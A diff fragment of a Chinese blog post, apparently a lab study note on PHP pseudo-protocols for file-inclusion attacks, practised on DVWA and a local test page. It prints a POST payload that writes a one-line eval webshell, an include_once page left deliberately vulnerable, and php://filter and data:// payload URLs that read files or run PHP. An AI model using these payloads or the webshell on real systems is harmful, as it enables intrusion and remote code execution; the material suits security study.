+<p><code>php://input</code>可以将要执行的语法<code>php代码</code>写在post中提交，下面通过DVWA来练习一下<br><img src="http://img-blog.csdnimg.cn/20190824191434377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若有写入权限，也可以写入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'1juhua.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_GET[cmd]); ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h2><p>说明：</p>
+<blockquote>
+<p>file:// — 访问本地文件系统，当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
+</blockquote>
+<p>模仿大师傅搭建一个本地靶场<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@$file = <span class="keyword">isset</span>($_GET[file])?$_GET[<span class="string">'file'</span>]:<span class="string">'ctf.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>($file);</span><br><span class="line">highlight_file($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img-blog.csdnimg.cn/20190825105148604.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190825105156973.png" alt="在这里插入图片描述"><br>使用<code>file</code>协议访问本地文件，构造payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=file://D:/PHPstudys/PHPTutorial/WWW/1.txt</span></span><br></pre></td></tr></table></figure>
+<p>访问成功<br><img src="http://img-blog.csdnimg.cn/20190825105341175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以用这个靶场来练习<code>php://filter</code>协议</p>
+<p>构造payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=php://filter/read/convert.base64-encode/resource=1.txt</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190825105602576.png" alt="在这里插入图片描述"><br>进行解码<br><img src="http://img-blog.csdnimg.cn/20190825105718645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接读取也可以</p>
+<p>payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=php://filter/resource=1.txt</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190825105948112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a><strong>zip://协议</strong></h2><blockquote>
+<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+</blockquote>
+<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><strong>phar:// 协议</strong></h2><blockquote>
+<p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p>
+</blockquote>
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><strong>data:// 协议</strong></h2><blockquote>
+<p>data: text/plain,&lt;?php 执行内容 ?&gt;<br>data://text/plain,<br>data://text/plain;base64,</p>
+</blockquote>
+<p>在DVWA中进行测试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain,&lt;?echo phpinfo()?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190831102250530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以用base64的格式编码PHP代码</p>
+<p><img src="http://img-blog.csdnimg.cn/20190831102747650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain;base64,PD9lY2hvIHBocGluZm8oKT8%2b</span></span><br></pre></td></tr></table></figure></p>
+<p>注意要按照这个格式才能成功<code>data://text/plain;base64,</code>还有base64编码后的加号和等号要手动的url编码，否则无法识别。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ %<span class="number">2b</span></span><br><span class="line">= %<span class="number">3</span>d</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190831103006294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><strong>http:// &amp; https:// 协议</strong></h2><blockquote>
+<p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。</p>
+</blockquote>
+<p><img src="http://img-blog.csdnimg.cn/2019083110352463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr>
+<p>总结：这次学习大致了解了一些PHP伪协议，但还是需要结合一些题目来练习一下，这次就先总结到这，等理解更深后，再来详细总结一下。</p>
 
     </article>
     <!-- license  -->
@@ -468,17 +475,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/08/CTF Crypto(密码学)总结/" title="CTF密码学总结">
-                    <div class="nextTitle">CTF密码学总结</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/24/web安全-XSS攻击（一)/" title="XSS理解+练习">
-                    <div class="prevTitle">XSS理解+练习</div>
+                <a href="/2019/08/25/Bugku—web题总结(二)/" title="Bugku—web题总结(二)">
+                    <div class="prevTitle">Bugku—web题总结(二)</div>
                 </a>
             
         </li>
@@ -603,7 +605,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#第一关"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第二关"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第三关"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第四关"><span class="toc-number">4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第五关"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第六关"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第七关"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第八关"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第九关"><span class="toc-number">9.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第十关"><span class="toc-number">10.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第十一关"><span class="toc-number">11.</span> <span class="toc-text">第十一关</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">1.</span> <span class="toc-text">php://</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一-php-filter"><span class="toc-number">1.0.1.</span> <span class="toc-text">(一)php://filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二-php-input"><span class="toc-number">1.0.2.</span> <span class="toc-text">(二)php://input</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-number">2.</span> <span class="toc-text">file://</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-协议"><span class="toc-number">3.</span> <span class="toc-text">zip://协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-协议"><span class="toc-number">4.</span> <span class="toc-text">phar:// 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-协议"><span class="toc-number">5.</span> <span class="toc-text">data:// 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-amp-https-协议"><span class="toc-number">6.</span> <span class="toc-text">http:// &amp; https:// 协议</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
